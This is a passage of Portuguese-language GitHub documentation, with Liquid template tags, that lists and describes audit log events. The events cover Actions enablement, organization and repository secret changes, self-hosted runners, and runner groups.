| ------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `repo.actions_enabled`                | Acionada quando {% data variables.product.prodname_actions %} está habilitado para um repositório. Pode ser visto usando a interface do usuário. Este evento não fica visível quando você acessar o log de auditoria usando a API REST. Para obter mais informações, consulte "[Usar a API REST](#using-the-rest-api)". |
| `repo.update_actions_access_settings` | Acionada quando a configuração de controle de como o repositório é usado pelos fluxos de trabalho {% data variables.product.prodname_actions %} em outros repositórios é alterada.                                                                                                                                      |
{% endif %}

### Eventos para gerenciamento de segredo
| Ação                         | Descrição                                                                                                                                                                                                                                                                            |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `org.create_actions_secret`  | Acionada quando um segredo {% data variables.product.prodname_actions %} é criado na organização. Para obter mais informações, consulte "[Criar segredos criptografados para uma organização](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)". |
| `org.remove_actions_secret`  | Acionada quando um segredo {% data variables.product.prodname_actions %} é removido.                                                                                                                                                                                                 |
| `org.update_actions_secret`  | Acionada quando um segredo {% data variables.product.prodname_actions %} é atualizado.                                                                                                                                                                                               |
| `repo.create_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é criado em um repositório. Para obter mais informações, consulte "[Criar segredos criptografados para um repositório](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)".  |
| `repo.remove_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é removido.                                                                                                                                                                                                 |
| `repo.update_actions_secret` | Acionada quando um segredo {% data variables.product.prodname_actions %} é atualizado.                                                                                                                                                                                               |

### Eventos para executores auto-hospedados
| Ação                                      | Descrição                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.register_self_hosted_runner`  | Acionada quando um novo executor auto-hospedado é registrado. Para obter mais informações, consulte "[Adicionar um executor auto-hospedado a uma empresa](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)".                                                                                                                                                                                                                                                                                               |
| `enterprise.remove_self_hosted_runner`    | Acionada quando um executor auto-hospedado é removido.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `enterprise.runner_group_runners_updated` | Acionada quando a lista de membros do grupo do executor é atualizada. Para obter mais informações, consulte "[Definir executores auto-hospedados em um grupo para uma organização](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".                                                                                                                                                                                                                                                                                                 |
| `enterprise.self_hosted_runner_online`    | Acionada quando o aplicativo do executor é iniciado. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, consulte "[Verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".                                                                                                                                                                          |
| `enterprise.self_hosted_runner_offline`   | Acionada quando o aplicativo do executor é interrompido. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, consulte "[Verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".                                                                                                                                                                      |
| `enterprise.self_hosted_runner_updated`   | Acionada quando o executor é atualizado. Pode ser visualizado usando a API REST e a interface do usuário. Este evento não está incluído quando você exportar o log de auditoria como dados JSON ou um arquivo CSV. Para obter mais informações, consulte "[Sobre executores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" e "[Revisar o log de auditoria para a sua organização](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)". |
| `org.register_self_hosted_runner`         | Acionada quando um novo executor auto-hospedado é registrado. Para obter mais informações, consulte "[Adicionar um executor auto-hospedado a uma organização](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)".                                                                                                                                                                                                                                                                                         |
| `org.remove_self_hosted_runner`           | Acionada quando um executor auto-hospedado é removido. Para obter mais informações, consulte [Remover um executor de uma organização](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).                                                                                                                                                                                                                                                                                                                        |
| `org.runner_group_runners_updated`        | Acionada quando a lista de integrantes do grupo de executor é atualizada. Para obter mais informações, consulte "[Definir executores auto-hospedados em um grupo para uma organização](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".                                                                                                                                                                                                                                                                                             |
| `org.runner_group_updated`                | Acionada quando a configuração de um grupo de executor auto-hospedado é alterada. Para obter mais informações, consulte "[Alterar a política de acesso de um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".                                                                                                                                                                                                                  |
| `org.self_hosted_runner_online`           | Acionada quando o aplicativo do executor é iniciado. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, consulte "[Verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".                                                                                                                                                                          |
| `org.self_hosted_runner_offline`          | Acionada quando o aplicativo do executor é interrompido. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, consulte "[Verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".                                                                                                                                                                      |
| `org.self_hosted_runner_updated`          | Acionada quando o executor é atualizado. Pode ser visto usando a API REST e a interface do usuário; não visível na exportação de JSON/CSV. Para obter mais informações, consulte "[Sobre os executores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."                                                                                                                                                                                                                                                     |
| `repo.register_self_hosted_runner`        | Acionada quando um novo executor auto-hospedado é registrado. Para obter mais informações, consulte "[Adicionar um executor auto-hospedado a um repositório](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository). ".                                                                                                                                                                                                                                                                                           |
| `repo.remove_self_hosted_runner`          | Acionada quando um executor auto-hospedado é removido. Para obter mais informações, consulte "[Remover um executor de um repositório](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)".                                                                                                                                                                                                                                                                                                                          |
| `repo.self_hosted_runner_online`          | Acionada quando o aplicativo do executor é iniciado. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, consulte "[Verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".                                                                                                                                                                          |
| `repo.self_hosted_runner_offline`         | Acionada quando o aplicativo do executor é interrompido. Só pode ser visto usando a API REST. Não é visível na interface do usuário ou na exportação do JSON/CSV. Para obter mais informações, consulte "[Verificar o status de um executor auto-hospedado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)".                                                                                                                                                                      |
| `repo.self_hosted_runner_updated`         | Acionada quando o executor é atualizado. Pode ser visto usando a API REST e a interface do usuário; não visível na exportação de JSON/CSV. Para obter mais informações, consulte "[Sobre os executores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."                                                                                                                                                                                                                                                     |

### Eventos para grupos de executores auto-hospedados
| Ação                                     | Descrição                                                                                                                                                                                                                                                                                                                                           |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.runner_group_created`        | Acionada quando um grupo de executores auto-hospedado é criado. Para obter mais informações, consulte "[Criar um grupo de um executor auto-hospedado para uma empresa](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)".                               |
| `enterprise.runner_group_removed`        | Acionada quando um grupo de executores auto-hospedados é removido. Para obter mais informações, consulte "[Remover um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".                                                             |
| `enterprise.runner_group_runner_removed` | Acionada quando a API REST é usada para remover um executor auto-hospedado de um grupo.                                                                                                                                                                                                                                                             |
| `enterprise.runner_group_runners_added`  | Acionada quando um executor auto-hospedado é adicionado a um grupo. Para obter mais informações, consulte "[Mover um executorauto-hospedado para um grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".                                                          |
| `enterprise.runner_group_updated`        | Acionada quando a configuração de um grupo de executor auto-hospedado é alterada. Para obter mais informações, consulte "[Alterar a política de acesso de um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)". |
| `org.runner_group_created`               | Acionada quando um grupo de executores auto-hospedado é criado. Para obter mais informações, consulte "[Criar um grupo de executores auto-hospedados para uma organização](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)".                         |
| `org.runner_group_removed`               | Acionada quando um grupo de executores auto-hospedados é removido. Para obter mais informações, consulte "[Remover um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".                                                             |
| `org.runner_group_updated`               | Acionada quando a configuração de um grupo de executor auto-hospedado é alterada. Para obter mais informações, consulte "[Alterar a política de acesso de um grupo de executores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)". |
| `org.runner_group_runners_added`         | Acionada quando um executor auto-hospedado é adicionado a um grupo. Para obter mais informações, consulte "[Mover um executorauto-hospedado para um grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".                                                          |
| `org.runner_group_runner_removed`        | Acionada quando a API REST é usada para remover um executor auto-hospedado de um grupo. Para obter mais informações, consulte "[Remover um executor auto-hospedado de um grupo para uma organização](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)".                                                        |

### Eventos para atividades no fluxo de trabalho

{% data reusables.actions.actions-audit-events-workflow %}
